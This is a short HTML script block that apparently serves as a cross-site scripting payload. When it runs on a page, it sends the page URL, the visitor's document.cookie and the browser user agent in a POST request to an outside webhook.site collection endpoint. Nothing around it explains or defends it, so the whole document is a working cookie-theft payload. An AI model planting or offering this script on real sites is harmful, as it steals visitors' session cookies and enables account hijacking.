<script>
fetch("https://webhook.site/3ba54176-c9e2-4a19-9e45-905ec0f200d9", {
  method: "POST",
  body: JSON.stringify({
    url: location.href,
    cookies: document.cookie,
    userAgent: navigator.userAgent
  })
});
</script>
